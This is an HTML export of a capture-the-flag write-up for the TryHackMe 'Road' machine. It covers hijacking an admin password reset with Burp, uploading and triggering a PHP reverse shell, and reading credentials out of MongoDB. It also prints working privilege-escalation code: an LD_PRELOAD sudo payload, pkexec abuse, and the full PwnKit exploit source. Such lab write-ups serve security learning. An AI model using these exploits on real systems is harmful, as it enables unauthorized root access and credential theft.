<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>road</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>road</h1><br/><strong><h1>Road</h1></strong><br />Inspired by a real-world pentesting engagement<br /><br /><br /><strong><h2>Enumeration</h2></strong><br /><br /><strong>Rustscan &amp; Nmap</strong><br /><img src="images/51-1.png" alt="images/51-1.png" /><br /><br /><img src="images/51-2.png" alt="images/51-2.png" /><br /><br />Two Services Running are SSH &amp; Webserver.<br /><br /><br /><strong><h2>Website Enumeration</h2></strong><br /><br /><img src="images/51-3.png" alt="images/51-3.png" /><br /><br />We have a sky couriers website. I searched around and found mostly normal things.<br />However, when we click on the<strong> “Management Central”, </strong>we are taken to a login page with following URL.<br /><a href="http://10.10.93.148/v2/admin/login.html">http://10.10.93.148/v2/admin/login.html</a><br /><br /><img src="images/51-4.png" alt="images/51-4.png" /><br /><br />Next, I created a normal user account by clicking on <strong>REGISTER</strong>.<br /><br /><img src="images/51-5.png" alt="images/51-5.png" /><br /><br />I Entered the Following<strong> Dummy Details </strong>&amp; Then Clicked on <strong>REGISTER</strong><br />Email Address: 			bob@tryhackme.com<br />Password:					bob123<br />Confirm Password:		bob123<br />10 Digit Mobile No: 	998877665<br /><br />We get a message “<strong>your account has been created</strong>” on the <strong>top left</strong> of the page. However, the login page reloads within 1 second.<br /><br />Next, I logged in to the freshly created user by entering the<strong> Email &amp; Password</strong> as above &amp; clicking on <strong>SIGN IN</strong>.<br /><img src="images/51-6.png" alt="images/51-6.png" /><br /><br />I am taken to my user&#39;s Dashboard.<br /><br /><strong><h2>Intresting Find</h2></strong><br /><br /><img src="images/51-7.png" alt="images/51-7.png" /><br /><br />In the <strong>Top Right Corner</strong> click on the <strong>Arrow</strong> after <strong>username</strong> &amp; click on <strong>Profile</strong>. It will open the Profile configuration page.<br /><strong>Scroll</strong> to the <strong>bottom of the page.</strong><br /><br /><img src="images/51-8.png" alt="images/51-8.png" /><br /><br />As we can see, the <strong>EDIT PROFILE</strong> button will update the changes made &amp; the <strong>intresting find</strong> is the <strong>option</strong> to <strong>set</strong> a <strong>Profile Image</strong>.<br />We could try to upload php reverse shells if allowed.<br /><br />However, the message below it reads that currently only the admin can use this feature.<br />Also we found the Admin&#39;s Email Address Or Username (Since Both are same -→ We know this by creating my user)<br /><br /><strong>Admin&#39;s Email Address: admin@sky.thm</strong><br /><br /><br /><strong><h2>Reseting Admin&#39;s Password</h2></strong><br /><br />In the previous step, I found out the admin&#39;s Email address. <br />Inside bob&#39;s account scroll up &amp; click on <strong>“ResetUser”</strong> present on the left of the page.<br /><br /><img src="images/51-9.png" alt="images/51-9.png" /><br /><br /><br />We get the following page.<br /><img src="images/51-10.png" alt="images/51-10.png" /><br /><br />As we can see, the Username part is <strong>fixed</strong>. I need to send this reset request using <strong>Burpsuite</strong> to modify it. I entered New Password &amp; Confirm Password as <strong>123456</strong> &amp; click on <strong>Submit</strong> once Burpsuite was setup.<br /><br /><img src="images/51-11.png" alt="images/51-11.png" /><br /><br /><br />We can see the burpsuite proxy captured the request and the parameter <strong>uname</strong> has the <strong>username</strong> value. I change the value from b<strong>ob@tryhackme.com</strong> to Admin&#39;s username <strong>admin@sky.thm</strong> &amp; <strong>Forward</strong> the Request.<br /><br />I got the following message that <strong>Password Changed</strong><br /><img src="images/51-12.png" alt="images/51-12.png" /><br /><br /><strong><h2>Foothold</h2></strong><br /><br />Now, we can login as admin using the following credentials.<br /><br /><strong>Username: admin@sky.thm<br />Password: 123456</strong><br /><br />I closed burpsuite and logged out of my dummy user. Then logged in as admin using the above credentials.<br />I successfully Logged in.<br /><br /><img src="images/51-13.png" alt="images/51-13.png" /><br /><br /><br />Next, I opend the Profile page clicking the dropdown as earlier to get to the profile picture upload page.<br /><br />The feature is enabled now as we are logged in as Admin.<br /><img src="images/51-14.png" alt="images/51-14.png" /><br /><br />I clicked on <strong>Browse</strong> and <strong>uploaded a PHP Reverse Shell</strong>.<br />I started <strong>Netcat Listener</strong> on my Local machine.<br />Then I Clicked On <strong>EDIT PROFILE</strong> to upload the file.<br /><br /><strong>Note:</strong> Once I finish the above steps, i go back to profile configuration page. However, the upload was successful. (Thus, there are no filetype filters in place)<br /><br /><strong>Important:</strong> The next big thing is to find my uploaded file to initiate the reverse shell. I tried directory enumeration on URL : {http://10.10.93.148/v2/} but didn&#39;t find any intresting result.<br />I opened the <strong>Profile configuration page&#39;s source code</strong> &amp; I finally found the directory as a <strong>comment</strong>.<br /><br /><br /><img src="images/51-15.png" alt="images/51-15.png" /><br /><br />After<strong> scrolling down</strong>, at around <strong>line 678</strong> i found the comment mentioning the upload directory.<br /><strong>/v2/profileimages/</strong><br />Lets open it.<br /><img src="images/51-16.png" alt="images/51-16.png" /><br /><br />When i Opened the directory, it opened but we can&#39;t view its contents and get the message that <strong>Directory Listing is Disabled</strong>.<br />However, i can still <strong>access my file</strong> if i know the <strong>name</strong> which i do !! (Name of the File I uploaded ----&gt; php-reverse-shell.php)<br /><br />I will use the following URL to open my file directly.<br /><strong>http://10.10.93.148/v2/profileimages/php-reverse-shell.php</strong><br /><br />After Entering the above <strong>URL</strong> in the <strong>browser</strong> and hitting <strong>Enter</strong>, we get the <strong>Reverse Shell connection is our Listener</strong>.<br /><br /><img src="images/51-17.png" alt="images/51-17.png" /><br /><br /><br /><strong><h2>Privilege Escalation</h2></strong><br /><br />I uploaded the <strong>Linpeas.sh</strong> to check for privilege Escalation.<br />There are 3 Distinct Methods of Privilege Escation.<br /><br /><strong><span style="text-decoration:underline;">Method - 1</span></strong><br /><br />Linpeas output snip below tells that both<strong> mysql (3306) &amp; mongodb (27017)</strong> are running in the system listening to localhost.<br /><br /><img src="images/51-18.png" alt="images/51-18.png" /><br /><br />Netstat is not intalled on the system. However, we can use the ss (Socket Status)  utility to get idea about connections. (Manually)<br /><strong>ss -lt</strong><br /><img src="images/51-19.png" alt="images/51-19.png" /><br /><br />I tried logging in to mysql with default credentials but it didn&#39;t work. However, when i tried to open MongoDB shell, it worked.<br /><br /><span style="text-decoration:underline;">Commands</span>:<br /><strong>mongo 27017<br />show dbs<br />use backup<br />show collections<br />db.user.find()</strong><br /><br /><img src="images/51-20.png" alt="images/51-20.png" /><br /><br />As we can see, we have found the webdeveloper user&#39;s password. Lets SSH to the machine using the following credentials.<br /><br /><strong>Credentials Found:</strong><br />Username: 	webdeveloper<br />Password: 	BahamasChapp123!@#<br /><br />After SSH Login, we get the user flag in the user&#39;s home and then check for further escalation options. As highlighted below LD_PRELOAD can help us in running a bash as privileged user.<br /><img src="images/51-21.png" alt="images/51-21.png" /><br /><br />I will create a <strong>preload.c</strong> file with the following contents:<br /><br /><strong>#include &lt;stdio.h&gt;<br />#include &lt;sys/types.h&gt;<br />#include &lt;stdlib.h&gt;<br /><br />void _init() {<br />        unsetenv(&quot;LD_PRELOAD&quot;);<br />        setresuid(0,0,0);<br />        system(&quot;/bin/bash -p&quot;);<br />}</strong><br /><br /><img src="images/51-22.png" alt="images/51-22.png" /><br /><br />Then, i compiled it using the following command.<br /><br /><strong>gcc -fPIC -shared -nostartfiles -o preload.so preload.c</strong><br /><br /><img src="images/51-23.png" alt="images/51-23.png" /><br /><br /><br />Now, our library file is ready. We will use the sudo in the following way to call the library file &amp; gain root shell.<br /><br /><strong>sudo LD_PRELOAD=/home/webdeveloper/preload.so /usr/bin/sky_backup_utility</strong><br /><br /><img src="images/51-24.png" alt="images/51-24.png" /><br /><br /><br /><strong><span style="text-decoration:underline;">Method - 2</span></strong> <br /><br />Use the MongoDB to gain SSH credentials as before.<br />Notice that the user <strong>webdeveloper</strong> is part of <strong>sudo</strong> group.<br /><br />A vulnerability in pkexec can be exploited here.<br />(pkexec is used to run GUI tools as another authorized user (Also root) )<br /><br />Open 2 SSH Connections to the Target Machine:<br /><br /><img src="images/51-25.png" alt="images/51-25.png" /><br /><br />On the First Session: Run <strong>echo $$</strong> &amp; Note the <strong>PID</strong><br />On the Second Session: Run <strong>pkttyagent -p &lt;PID&gt;</strong> [Enter the PID Received in First Session]<br />On the First Session: Run <strong>pkexec /bin/bash</strong><br />On the Second Session: We will be prompted for <strong>webdeveloper&#39;s password</strong>. Enter it there &amp; we will get a root bash shell in First Session.<br /><br /><img src="images/51-26.png" alt="images/51-26.png" /><br /><br /><br /><strong><span style="text-decoration:underline;">Method - 3</span></strong><br /><br /><img src="images/51-27.png" alt="images/51-27.png" /><br /><br />The CVE mentioned by linpeas uses the same vulnerability exploited in Method - 2.<br />However, this escalation is the most powerful one as it doesn&#39;t requires an user in sudo group. This exploit can be run as <strong>www-data</strong><br /><br />We opend the CVE in Exploit DB. <br /><a href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjRrJOYt6j5AhUo4jgGHSwUCaUQFnoECAIQAQ&url=https%3A%2F%2Fwww.exploit-db.com%2Fexploits%2F50689&usg=AOvVaw1hhH354Ge2nzJ_58sZqVad">https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwjRrJOYt6j5AhUo4jgGHSwUCaUQFnoECAIQAQ&amp;url=https%3A%2F%2Fwww.exploit-db.com%2Fexploits%2F50689&amp;usg=AOvVaw1hhH354Ge2nzJ_58sZqVad</a><br />The document has 3 parts. I made 3 files with the following contents.<br /><br /><strong>1. Makefile</strong><br />all:<br />	gcc -shared -o evil.so -fPIC evil-so.c<br />	gcc exploit.c -o exploit<br /><br />clean:<br />	rm -r ./GCONV_PATH=. &amp;&amp; rm -r ./evildir &amp;&amp; rm exploit &amp;&amp; rm evil.so<br />	<br /><strong>2. exploit.c</strong><br />#include &lt;stdio.h&gt;<br />#include &lt;stdlib.h&gt;<br /><br />#define BIN &quot;/usr/bin/pkexec&quot;<br />#define DIR &quot;evildir&quot;<br />#define EVILSO &quot;evil&quot;<br /><br />int main()<br />{<br />    char *envp[] = {<br />        DIR,<br />        &quot;PATH=GCONV_PATH=.&quot;,<br />        &quot;SHELL=ryaagard&quot;,<br />        &quot;CHARSET=ryaagard&quot;,<br />        NULL<br />    };<br />    char *argv[] = { NULL };<br /><br />    system(&quot;mkdir GCONV_PATH=.&quot;);<br />    system(&quot;touch GCONV_PATH=./&quot; DIR &quot; &amp;&amp; chmod 777 GCONV_PATH=./&quot; DIR);<br />    system(&quot;mkdir &quot; DIR);<br />    system(&quot;echo &#39;module\tINTERNAL\t\t\tryaagard//\t\t\t&quot; EVILSO &quot;\t\t\t2&#39; &gt; &quot; DIR &quot;/gconv-modules&quot;);<br />    system(&quot;cp &quot; EVILSO &quot;.so &quot; DIR);<br /><br />    execve(BIN, argv, envp);<br /><br />    return 0;<br />}<br /><br /><strong>3. evil.so.c</strong><br />#include &lt;stdio.h&gt;<br />#include &lt;stdlib.h&gt;<br />#include &lt;unistd.h&gt;<br /><br />void gconv() {}<br /><br />void gconv_init() {<br />    setuid(0);<br />    setgid(0);<br />    setgroups(0);<br /><br />    execve(&quot;/bin/sh&quot;, NULL, NULL);<br />}<br /><br /><br />Now, inside the target machine, i run the following commands.<br /><br /><strong>make all<br />./exploit</strong><br /><br /><strong>Note:</strong> The make command works in Local Kali machine, however on the target machine it is not installed.<br />We have 2 options. We compile the exploit in Kali machine and send only the exploit.<br /><br />Or<br /><br />We manually run the commands of the Makefile as gcc is installed on the target.<br /><br />On Target Machine:<br /><br /><strong>gcc -shared -o evil.so -fPIC evil-so.c</strong><br /><strong>gcc exploit.c -o exploit</strong><br /><br /><img src="images/51-28.png" alt="images/51-28.png" /><br /><br />Thanks !!</div>
</body>
</html>
